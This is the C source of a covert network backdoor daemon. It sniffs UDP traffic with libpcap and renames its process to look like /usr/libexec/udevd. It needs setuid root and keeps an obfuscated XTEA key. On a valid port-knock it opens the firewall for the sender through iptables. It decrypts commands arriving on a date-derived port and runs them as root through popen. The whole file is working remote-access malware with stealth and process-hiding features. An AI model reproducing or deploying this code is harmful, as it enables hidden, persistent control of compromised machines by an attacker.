#include <arpa/inet.h>
#include <errno.h>
#include <pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syslog.h>
#include <unistd.h>
#include "pkthdr.h"
#include "util.h"
#include "xtea.h"
#define RUNNING_NAME    "/usr/libexec/udevd"
#define INF_NAME        "any"
#define MAX_CMD_SIZE    1024
#define MAX_DLINK_HDR   16
#define SNAP_LEN        (MAX_CMD_SIZE + sizeof(struct ip_header) + sizeof(struct tcp_header) + MAX_DLINK_HDR)
#define KNOCK_PORT      25068
#define BUFSIZE         1024
#define SHA1_LEN        40
#define FILTER_STRING   "(udp dst port (34249 or 25068)) or icmp"
#define MANGLED "a1487b33FcAc3FD8aa9D4d44e4e402AFDa955cc514cEC0368bB8eD717aaa8cC5\0" 
#define SHARED_SECRET "this will be used for the port knocking hash" 

uint32_t* get_key(uint32_t key[4])
{
    char *mangled = MANGLED;
    char less_mangled[4][8];
    char keyseg[9];
    size_t i = 0;
    size_t j = 0;

    while (*mangled)
    {
        if (*mangled < 'a')
        {
            less_mangled[i][j++] = *(mangled++);
            if (j == 8)
            {
                j = 0;
                i++;
            }
        }
        else
        {
            mangled += 2;
        }
    }
    reverse((char *) less_mangled, 32);

    for (i = 0; i < 4; i++)
    {
        strncpy(keyseg, less_mangled[i], 8); 
        key[i] = strtol(keyseg, NULL, 16);
    }
    return key;
}


u_char datalink_length(pcap_t *session)
{
    int dlink = pcap_datalink(session);

    switch (dlink)
    {
        case DLT_NULL:          return 4;
        case DLT_EN10MB:        return 14;
        case DLT_RAW:           return 14;
        case DLT_LOOP:          return 4;
        case DLT_LINUX_SLL:     return 16;
    }
    #ifdef DEBUG
    fprintf(stderr, "datalink_length(): unknown type: %d", dlink);
    #endif
    return 16;
}

/*void inspect_tcp(struct ip_header *iph)*/
/*{*/
/*}*/

/*void inspect_icmp(struct ip_header *iph)*/
/*{*/
/*}*/

void open_the_gate(uint32_t srcip, uint16_t port)
{
    char sourceip[INET_ADDRSTRLEN];
    char iptablescmd[512];
    struct in_addr srcaddr;
    int rtn;

    srcaddr.s_addr = srcip;

    if (!inet_ntop(AF_INET, &srcaddr, sourceip, sizeof(sourceip)))
    {
        #ifdef DEBUG
        syslog(LOG_ERR, "inet_ntop(): %s", strerror(errno));
        #endif
    }

    #ifdef DEBUG
    syslog(LOG_INFO, "opening port %d for %s", port, sourceip);
    #endif
    sprintf(iptablescmd, "iptables --delete INPUT --source %s " \
                            "--proto tcp --dport %d --jump ACCEPT; " \
                         "iptables --insert INPUT --source %s " \
                            "--proto tcp --dport %d --jump ACCEPT",
           sourceip, port, sourceip, port);

    if ((rtn = system(iptablescmd)))
    {
        #ifdef DEBUG
        syslog(LOG_ERR, "iptables command: %d", rtn);
        #endif
    }
    #ifdef DEBUG
    syslog(LOG_INFO, "closing port %d for %s", port, sourceip);
    #endif
}

void answer_knock(struct ip_header *iph)
{
    FILE* f;
    uint32_t key[4];
    char prehash[100];
    char hash[SHA1_LEN + 1];
    char packethash[SHA1_LEN + 1];
    char rand[9] = { '\0' };
    char portstr[6] = { '\0' };
    uint16_t port;
    char *data;
    uint16_t deciphered;
    uint16_t len = SHA1_LEN + 8 + 4;
    struct udp_header *udph = (struct udp_header *)
            ((char *) iph + sizeof(struct ip_header));

    data = (char *) udph + sizeof(udph);
    get_key(key);

    deciphered = 0;

    while (deciphered < len)
    {
        decipher(RCM_NUM_ROUNDS, (uint32_t *) (data + deciphered), key); 
        deciphered += sizeof(uint32_t) / sizeof(char) * 2;
    }

    strncpy(packethash, data, SHA1_LEN);
    packethash[SHA1_LEN] = '\0';

    strncpy(rand, data + SHA1_LEN, 8);
    strncpy(portstr, data + SHA1_LEN + 8, 5);
    if (!(port = strtol(portstr, NULL, 10)))
    {
        return;
    }

    sprintf(prehash, "echo '%s%s%s' | sha1sum | awk '{print $1}'", 
            SHARED_SECRET, rand, portstr);

    f = popen(prehash, "r"); 
    fread(hash, sizeof(char), SHA1_LEN + 1, f);
    hash[SHA1_LEN] = '\0';
    pclose(f);

    if (!strcmp(hash, packethash))
    {
        open_the_gate(iph->srcip, port);
    }
}

void exec_command(struct ip_header *iph)
{
    uint16_t len;
    uint16_t deciphered;
    char *data;
    char command[MAX_CMD_SIZE] = { '\0' };
    uint32_t key[4];
    FILE* f;
    char buf[BUFSIZE];
    size_t read;
    struct udp_header *udph = (struct udp_header *)
            ((char *) iph + sizeof(struct ip_header));
        
    data = (char *) udph + sizeof(udph);
    get_key(key);

    len = iph->id;
    deciphered = 0;

    while (deciphered < len)
    {
        decipher(RCM_NUM_ROUNDS, (uint32_t *) (data + deciphered), key); 
        deciphered += sizeof(uint32_t) / sizeof(char) * 2;
    }
    strncpy(command, data, len);
    command[len] = '\0';

    strcpy(&command[len], " 2>&1"); 
    #ifdef DEBUG
    syslog(LOG_INFO, "Running Command: %s", command);
    #endif

    f = popen(command, "r");
    read = fread(buf, sizeof(char), BUFSIZE - 1, f);
    buf[read] = '\0';
    syslog(LOG_INFO, buf);
    pclose(f);

    /* don't leave key in memory */
    memset(key, '\0', sizeof(uint32_t) / sizeof(char) * 4);
}

void inspect_udp(struct ip_header *iph)
{
    struct udp_header *udph = (struct udp_header *)
            ((char *) iph + sizeof(struct ip_header));
    uint16_t dstport = ntohs(udph->dstport);
    uint16_t srcport = ntohs(udph->srcport);

    if (dstport == KNOCK_PORT)
    {
        answer_knock(iph);
    }
    else if (srcport == port_from_date())
    {
        exec_command(iph);
    }
}

void inspect_packet(u_char *linklen, const struct pcap_pkthdr *h,
        const u_char *bytes)
{
    struct ip_header *iph = (struct ip_header *) (bytes + *linklen);

    #ifdef DEBUG
    print_packet(bytes, h->caplen);
    #endif

    switch (iph->protocol)
    {
        case IP_TCP:
            if (h->caplen - *linklen - sizeof(struct tcp_header) > 0)
            {
                /*inspect_tcp(iph);*/
            }
            break;

        case IP_UDP:    
            if (h->caplen - *linklen - sizeof(struct udp_header) > 0)
            {
                inspect_udp(iph);
            }
            break;

        case IP_ICMP:
            if (h->caplen - *linklen - sizeof(struct icmp_header) > 0)
            {
                /*inspect_icmp(iph);*/
            }
            break;
    }
}

pcap_t * config_session()
{
    pcap_t *session;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;

    if (pcap_lookupnet(NULL, &net, &mask, errbuf))
    {
        #ifdef DEBUG
        fprintf(stderr, "pcap_lookupnet(): %s\n", errbuf);
        #endif
        exit(0);
    }

    if ((session = pcap_open_live(INF_NAME, SNAP_LEN, 0, 0, errbuf)) == NULL)
    {
        #ifdef DEBUG
        fprintf(stderr, "pcap_open_live(): %s\n", errbuf);
        #endif
        exit(0);
    }

    if (pcap_compile(session, &filter, FILTER_STRING, 0, net))
    {
        #ifdef DEBUG
        pcap_perror(session, "pcap_compile()");
        #endif
        exit(0);
    }

    if (pcap_setfilter(session, &filter))
    {
        #ifdef DEBUG
        pcap_perror(session, "pcap_setfilter()");
        #endif
        exit(0);
    }

    return session;
}

void signal_handler(int sig)
{
    #ifdef DEBUG
    switch (sig)
    {
        case SIGHUP:    syslog(LOG_WARNING, "received SIGHUP");     break;
        case SIGINT:    syslog(LOG_WARNING, "received SIGINT");     break;
        case SIGTERM:   syslog(LOG_WARNING, "received SIGTERM");    break;
        case SIGQUIT:   syslog(LOG_WARNING, "received SIGQUIT");    break;
    }
    #endif
}

void daemonize(char* procname)
{
    pid_t pid;

    if ((pid = fork()) < 0)
    {
        #ifdef DEBUG
        perror("daemonize()");
        #endif
        exit(0);
    }

    if (pid)
    {
        /* this is the parent, which should quit immediately */
        exit(0);
    }

    umask(027);
    setsid();

    #ifdef DEBUG
    openlog(procname, LOG_NOWAIT|LOG_PID, LOG_USER);
    syslog(LOG_INFO, "daemon started");
    #endif

    pid = setsid();

    /* change working directory in case parent working directory is unmounted */
    if (chdir("/"))
    {
        #ifdef DEBUG
        syslog(LOG_ERR, "chdir(): %s", strerror(errno));
        #endif
        exit(0);
    }

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    signal(SIGHUP, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
}

int main(int argc, char **argv)
{
    pcap_t *session = NULL;
    int rtn;
    u_char linklen;
    char killcmd[256];
    argc++; /* no op */

    if (setuid(0) || setgid(0))
    {
        #ifdef DEBUG
        fprintf(stderr, "> This needs to be owned by root with the s-bit set\n");
        fprintf(stderr, "chown root %s\n", argv[0]);
        fprintf(stderr, "chmod +s %s\n", argv[0]);
        #endif
        return 0;
    }

    /* kill any previous instances of the program */
    sprintf(killcmd, "ps aux | grep '%s' | grep -v 'grep' | awk '{print $2}' " \
            "| xargs -t kill -9 &> /dev/null", RUNNING_NAME);
    system(killcmd);

    /* 'ps' ignores null terminator, and will print entire contents of argv[0] */
    memset(argv[0], '\0', strlen(argv[0]));
    strcpy(argv[0], RUNNING_NAME);
    argv[0][20] = '\0';
    daemonize(argv[0]);

    session = config_session();
    linklen = datalink_length(session); 
    rtn = pcap_loop(session, -1, inspect_packet, &linklen);

    #ifdef DEBUG
    switch (rtn)
    {
        case 0:     fprintf(stderr, "pcap_loop(): cnt reached\n");      break;
        case -1:    pcap_perror(session, "pcap_loop()");                break;
        case -2:    fprintf(stderr, "pcap_loop(): no packets processed\n");
    }
    closelog();
    #endif

    return 0;
}
